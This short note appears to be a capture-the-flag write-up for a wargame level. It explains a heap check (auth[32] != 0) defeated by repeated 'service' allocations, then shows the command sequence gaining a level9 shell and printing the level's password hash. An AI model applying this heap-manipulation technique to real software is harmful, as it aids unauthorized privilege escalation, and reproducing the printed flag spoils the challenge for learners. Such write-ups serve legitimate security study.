the program can allocate memory with the command 'auth ' ans 'service'
the instruction ```auth[32] != 0``` check if adress of auth + 32 exist
we can call multiple time service to allocate memory at this space


```
auth 
0x804a008, (nil) 
service
0x804a008, 0x804a018 
service
0x804a008, 0x804a028 
login
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```